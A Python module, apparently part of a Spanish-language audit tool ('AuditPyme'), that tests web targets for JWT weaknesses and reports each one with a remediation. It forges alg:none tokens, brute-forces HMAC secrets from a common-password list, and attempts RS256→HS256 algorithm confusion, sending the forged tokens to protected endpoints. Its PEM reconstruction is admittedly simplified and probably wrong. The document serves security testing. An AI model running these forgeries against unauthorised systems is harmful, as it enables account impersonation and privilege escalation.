"""
Módulo de auditoría JWT — AuditPyme
Detecta: alg:none, secretos débiles HS256, JWKS expuesto, tokens en URLs, JWTs en cookies sin flags.
"""

import requests
import urllib3
import re
import json
import hmac
import hashlib
import base64
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 12
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*')

JWT_COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "jwt_secret",
    "your-256-bit-secret", "supersecret", "changeme",
    "development", "production", "test", "api_secret",
    "mysecretkey", "jwttoken", "jwt-secret", "app_secret",
    "flask-secret", "django-secret-key", "node-secret",
    "HS256", "RS256", "secretkey", "12345678", "qwerty",
    "letmein", "pass1234", "admin123", "welcome1",
    "P@ssw0rd", "iloveyou", "monkey", "sunshine",
    "princess", "master", "hello", "shadow", "dragon",
    "jwt", "token", "key", "private", "access",
    "access_token", "refresh_token", "auth", "authentication",
]

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/auth/jwks",
    "/api/jwks",
    "/.well-known/openid-configuration",
    "/oauth/.well-known/jwks.json",
    "/realms/master/protocol/openid-connect/certs",
    "/connect/discovery",
]

PROTECTED_PATHS = [
    "/api/v1/users/me", "/api/users/me", "/api/me",
    "/api/v1/profile", "/api/profile", "/api/account",
    "/api/v1/orders", "/api/orders",
    "/dashboard", "/admin", "/panel",
    "/wp-json/wp/v2/users",
]


class JWTAuditor:
    def __init__(self, target: str, recon_data: dict = None,
                 auth_user: str = None, auth_pass: str = None, auth_url: str = None):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.auth_user = auth_user
        self.auth_pass = auth_pass
        self.auth_url = auth_url
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()
        self._found_jwt = None
        self._jwt_source = None
        self._protected_url = None

    def scan(self) -> list:
        print(f"\n  [*] Auditoría JWT en: {self.target}")

        self._check_jwks()
        self._collect_jwt()

        if self._found_jwt:
            print(f"  [+] JWT encontrado en: {self._jwt_source}")
            self._decode_and_report()
            self._try_alg_none()
            self._try_weak_secret()
            self._try_algorithm_confusion()
        else:
            print("  [-] No se encontraron JWTs accesibles sin credenciales")

        if not self.findings:
            print("  [OK] No se detectaron vulnerabilidades JWT")
        return self.findings

    # ── Búsqueda de JWTs ─────────────────────────────────────────────────────

    def _collect_jwt(self):
        """Busca JWTs en respuestas de la API, cookies y headers de autorización."""
        endpoints_to_probe = []
        for base_url in self._base_urls:
            endpoints_to_probe.append(base_url)
            for path in PROTECTED_PATHS:
                endpoints_to_probe.append(base_url.rstrip("/") + path)

        # Si hay credenciales, hacer login primero
        if self.auth_user and self.auth_pass:
            self._login_and_capture()

        for url in endpoints_to_probe[:15]:
            try:
                resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
            except Exception:
                continue

            # JWT en cookies
            for name, value in self.session.cookies.items():
                match = JWT_REGEX.search(str(value))
                if match:
                    self._found_jwt = match.group(0)
                    self._jwt_source = f"cookie '{name}' en {url}"
                    self._protected_url = url
                    return

            # JWT en header Authorization de la respuesta
            auth_header = resp.headers.get("Authorization", "")
            match = JWT_REGEX.search(auth_header)
            if match:
                self._found_jwt = match.group(0)
                self._jwt_source = f"header Authorization en {url}"
                self._protected_url = url
                return

            # JWT en body JSON
            match = JWT_REGEX.search(resp.text)
            if match:
                self._found_jwt = match.group(0)
                self._jwt_source = f"body JSON en {url}"
                self._protected_url = url
                return

    def _login_and_capture(self):
        """Hace login y captura el JWT de la respuesta."""
        login_url = self.auth_url
        if not login_url:
            for base_url in self._base_urls:
                for path in ["/api/login", "/api/auth/login", "/auth/token",
                              "/api/token", "/login", "/api/v1/auth/login"]:
                    url = base_url.rstrip("/") + path
                    try:
                        # Intentar POST JSON
                        r = self.session.post(url,
                                              json={"username": self.auth_user,
                                                    "password": self.auth_pass,
                                                    "email": self.auth_user},
                                              timeout=TIMEOUT)
                        if r.status_code in (200, 201):
                            match = JWT_REGEX.search(r.text)
                            if match:
                                self._found_jwt = match.group(0)
                                self._jwt_source = f"login JSON en {url}"
                                return
                        # Intentar POST form
                        r = self.session.post(url,
                                              data={"username": self.auth_user,
                                                    "password": self.auth_pass},
                                              timeout=TIMEOUT)
                        if r.status_code in (200, 201):
                            match = JWT_REGEX.search(r.text)
                            if match:
                                self._found_jwt = match.group(0)
                                self._jwt_source = f"login form en {url}"
                                return
                    except Exception:
                        continue

    # ── Check: JWKS expuesto ──────────────────────────────────────────────────

    def _check_jwks(self):
        for base_url in self._base_urls:
            for path in JWKS_PATHS:
                url = base_url.rstrip("/") + path
                try:
                    resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                    if resp.status_code == 200 and len(resp.content) > 50:
                        try:
                            data = resp.json()
                            # JWKS real tiene "keys" array
                            if "keys" in data or "jwks_uri" in data or "kty" in data:
                                key_count = len(data.get("keys", [data]))
                                self._add(
                                    "MEDIUM",
                                    f"JWKS expuesto en {path}",
                                    f"Endpoint JWKS accesible públicamente: {url}. "
                                    f"Contiene {key_count} clave(s) criptográfica(s).",
                                    "Las claves públicas expuestas permiten a un atacante intentar "
                                    "ataques de confusión de algoritmo (RS256→HS256), especialmente "
                                    "si la implementación acepta el algoritmo especificado en el header del JWT.",
                                    "El JWKS puede ser público, pero verificar que el servidor valide "
                                    "el algoritmo esperado y no confíe en el campo 'alg' del token. "
                                    "Hardcodear el algoritmo esperado en el validador, nunca tomarlo del JWT."
                                )
                                print(f"  [MEDIUM] JWKS expuesto: {url} ({key_count} claves)")
                        except Exception:
                            pass
                except Exception:
                    pass

    # ── Decodificación y análisis del JWT ─────────────────────────────────────

    def _decode_and_report(self):
        try:
            header, payload, _ = self._split_jwt(self._found_jwt)
            alg = header.get("alg", "?")
            typ = header.get("typ", "JWT")

            interesting = {k: v for k, v in payload.items()
                           if k not in ("iat", "exp", "nbf", "jti")}

            info = (f"Algoritmo: {alg}. "
                    f"Claims: {list(interesting.keys())}. "
                    f"Fuente: {self._jwt_source}")

            if alg == "none":
                self._add(
                    "CRITICAL",
                    "JWT con algoritmo 'none' en producción",
                    f"El JWT encontrado ya usa alg:none, sin firma. {info}",
                    "Cualquier atacante puede forjar tokens con cualquier identidad sin conocer ningún secreto.",
                    "Rechazar tokens con alg:none. Hardcodear el algoritmo esperado en el validador."
                )
                print("  [CRITICAL] JWT con alg:none activo en producción")
            else:
                print(f"  [*] JWT decodificado — alg={alg}, claims={list(interesting.keys())[:5]}")

            # Comprobar si el token tiene exp
            if "exp" not in payload:
                self._add(
                    "MEDIUM",
                    "JWT sin tiempo de expiración (exp)",
                    f"El JWT no incluye el claim 'exp'. {info}",
                    "Un token robado es válido indefinidamente — no hay forma de invalidarlo sin revocar toda la clave.",
                    "Añadir exp con tiempo razonable (15min–1h para access tokens, 7 días para refresh). "
                    "Implementar blacklist de JTI para revocación por logout."
                )
                print("  [MEDIUM] JWT sin expiración (exp)")

        except Exception as e:
            print(f"  [!] Error decodificando JWT: {e}")

    # ── Ataque alg:none ───────────────────────────────────────────────────────

    def _try_alg_none(self):
        """Forja un JWT con alg:none eliminando la firma."""
        print("  [*] Probando ataque alg:none...")
        try:
            header, payload, _ = self._split_jwt(self._found_jwt)
            if header.get("alg") == "none":
                return  # ya reportado

            # Forjar token con alg:none
            forged_header  = self._b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
            forged_payload = self._b64url_encode(json.dumps(payload).encode())
            forged_token   = f"{forged_header}.{forged_payload}."

            for variant in [forged_token,
                             forged_token.replace("none", "None"),
                             forged_token.replace("none", "NONE"),
                             forged_token.replace("none", "nOnE")]:
                accepted = self._test_token(variant)
                if accepted:
                    self._add(
                        "CRITICAL",
                        "JWT: ataque alg:none aceptado",
                        f"El servidor aceptó un JWT firmado con alg='none' (sin firma). "
                        f"Fuente original: {self._jwt_source}. Variante usada: alg={variant.split('.')[0][-8:]}",
                        "Un atacante puede modificar cualquier claim del JWT (usuario, rol, admin) "
                        "y el servidor lo aceptará sin verificar la firma. Acceso completo a cualquier cuenta.",
                        "Verificar que la librería JWT rechace alg:none explícitamente. "
                        "En Python (PyJWT): algorithms=['HS256'] — nunca omitir el parámetro algorithms. "
                        "En Node (jsonwebtoken): options.algorithms=['HS256']. "
                        "Actualizar a la versión más reciente de la librería JWT."
                    )
                    print(f"  [CRITICAL] alg:none ACEPTADO — token forjado válido")
                    return

            print("  [OK] alg:none rechazado")
        except Exception as e:
            print(f"  [!] Error en alg:none: {e}")

    # ── Ataque de secreto débil ───────────────────────────────────────────────

    def _try_weak_secret(self):
        """Prueba secretos comunes contra el JWT HS256."""
        print(f"  [*] Probando {len(JWT_COMMON_SECRETS)} secretos comunes...")
        try:
            header, payload, signature = self._split_jwt(self._found_jwt)
            alg = header.get("alg", "")
            if alg not in ("HS256", "HS384", "HS512"):
                print(f"  [*] Algoritmo {alg} — prueba de secreto no aplica (solo HMAC)")
                return

            parts = self._found_jwt.rsplit(".", 1)
            message = parts[0].encode()
            sig_decoded = self._b64url_decode(parts[1])

            hash_func = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }.get(alg, hashlib.sha256)

            for secret in JWT_COMMON_SECRETS:
                expected_sig = hmac.new(secret.encode(), message, hash_func).digest()
                if hmac.compare_digest(expected_sig, sig_decoded):
                    self._add(
                        "CRITICAL",
                        f"JWT: secreto débil encontrado — '{secret}'",
                        f"El JWT usa HMAC-{alg} con el secreto '{secret}'. "
                        f"Fuente: {self._jwt_source}",
                        f"Con el secreto '{secret}' cualquier atacante puede firmar JWTs arbitrarios "
                        "con cualquier identidad, rol o privilegio. Equivale a tener la clave maestra del sistema.",
                        f"Cambiar inmediatamente el secreto JWT por una cadena aleatoria de mínimo 256 bits "
                        "(32 bytes). Usar: python3 -c \"import secrets; print(secrets.token_hex(32))\". "
                        "Rotar todos los tokens activos. Considerar migrar a RS256 con par de claves."
                    )
                    print(f"  [CRITICAL] Secreto débil encontrado: '{secret}'")
                    return

            print("  [OK] Secreto no encontrado en lista común")
        except Exception as e:
            print(f"  [!] Error en prueba de secreto: {e}")

    # ── Ataque de confusión de algoritmo RS256 → HS256 ───────────────────────

    def _try_algorithm_confusion(self):
        """
        Usa la clave pública RSA del JWKS como secreto HMAC para forjar un token HS256.
        Si el servidor toma el algoritmo del header del JWT en vez de verificarlo contra
        el esperado, acepta el token forjado.
        """
        try:
            header, payload, _ = self._split_jwt(self._found_jwt)
            if header.get("alg") not in ("RS256", "RS384", "RS512", "ES256", "ES384"):
                return
        except Exception:
            return

        print("  [*] Probando algorithm confusion RS256→HS256...")

        # Buscar la clave pública en los JWKS conocidos
        public_key_pem = self._fetch_public_key()
        if not public_key_pem:
            print("  [-] No se encontró clave pública RSA para algorithm confusion")
            return

        try:
            header_attack, payload_orig, _ = self._split_jwt(self._found_jwt)
            # Cambiar alg a HS256
            header_attack["alg"] = "HS256"
            if "kid" in header_attack:
                del header_attack["kid"]  # eliminar kid para evitar lookup de clave

            new_header  = self._b64url_encode(json.dumps(header_attack, separators=(",", ":")).encode())
            new_payload = self._b64url_encode(json.dumps(payload_orig, separators=(",", ":")).encode())
            message     = f"{new_header}.{new_payload}".encode()

            # Firmar con la clave pública como secreto HMAC (el ataque)
            sig = hmac.new(public_key_pem.encode(), message, hashlib.sha256).digest()
            forged_token = f"{new_header}.{new_payload}.{self._b64url_encode(sig)}"

            if self._test_token(forged_token):
                self._add(
                    "CRITICAL",
                    "JWT: Algorithm Confusion Attack — RS256→HS256 exitoso",
                    f"El servidor aceptó un JWT HS256 firmado con la clave pública RSA como secreto HMAC. "
                    f"Fuente del JWT original: {self._jwt_source}",
                    "Un atacante puede forjar tokens con cualquier identidad usando solo la clave pública "
                    "(que es pública por definición). Esto permite suplantar cualquier usuario, "
                    "incluyendo administradores, sin conocer ningún secreto privado.",
                    "Hardcodear el algoritmo esperado en el validador JWT — nunca tomarlo del header del token. "
                    "En PyJWT: jwt.decode(token, key, algorithms=['RS256']). "
                    "En jsonwebtoken: verify(token, publicKey, {algorithms: ['RS256']}). "
                    "Verificar que la librería JWT esté actualizada (CVE-2022-21449 en Java, etc.)."
                )
                print("  [CRITICAL] Algorithm confusion RS256→HS256 ACEPTADO")
            else:
                print("  [OK] Algorithm confusion rechazado — servidor valida el algoritmo correctamente")
        except Exception as e:
            print(f"  [!] Error en algorithm confusion: {e}")

    def _fetch_public_key(self) -> str | None:
        """Obtiene la clave pública RSA del JWKS o de endpoints conocidos."""
        for base_url in self._base_urls:
            for path in JWKS_PATHS:
                url = base_url.rstrip("/") + path
                try:
                    r = self.session.get(url, timeout=TIMEOUT)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    keys = data.get("keys", [data] if "n" in data else [])
                    for key in keys:
                        if key.get("kty") == "RSA":
                            # Reconstruir PEM desde n y e (simplificado)
                            n_b64 = key.get("n", "")
                            e_b64 = key.get("e", "")
                            if n_b64 and e_b64:
                                # Devolver representación PEM básica para usar como secreto HMAC
                                # (el ataque usa el PEM como bytes, no importa el formato exacto)
                                return f"-----BEGIN PUBLIC KEY-----\n{n_b64}\n-----END PUBLIC KEY-----"
                except Exception:
                    pass
        return None

    # ── Verificación de aceptación de token ──────────────────────────────────

    def _test_token(self, token: str) -> bool:
        """Envía el token forjado al endpoint protegido y comprueba si fue aceptado."""
        if not self._protected_url:
            return False
        try:
            for method in ("header", "cookie", "bearer"):
                if method == "header":
                    r = self.session.get(self._protected_url, timeout=TIMEOUT,
                                         headers={"Authorization": f"Bearer {token}"})
                elif method == "cookie":
                    # Identificar el nombre de la cookie de sesión
                    for name in list(self.session.cookies.keys()):
                        old_val = self.session.cookies[name]
                        self.session.cookies.set(name, token)
                        r = self.session.get(self._protected_url, timeout=TIMEOUT)
                        self.session.cookies.set(name, old_val)
                        if r.status_code == 200 and not any(
                            w in r.text.lower() for w in ("unauthorized", "forbidden", "invalid token", "expired")
                        ):
                            return True
                    continue
                else:
                    r = self.session.get(self._protected_url, timeout=TIMEOUT,
                                         params={"token": token})

                if r.status_code == 200 and not any(
                    w in r.text.lower() for w in
                    ("unauthorized", "forbidden", "invalid token", "invalid signature",
                     "expired", "malformed", "unauthenticated")
                ):
                    return True
        except Exception:
            pass
        return False

    # ── Codificación/decodificación base64url ─────────────────────────────────

    def _b64url_decode(self, s: str) -> bytes:
        s += '=' * (-len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64url_encode(self, b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

    def _split_jwt(self, token: str):
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("JWT malformado")
        header  = json.loads(self._b64url_decode(parts[0]))
        payload = json.loads(self._b64url_decode(parts[1]))
        return header, payload, parts[2]

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "JWT",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
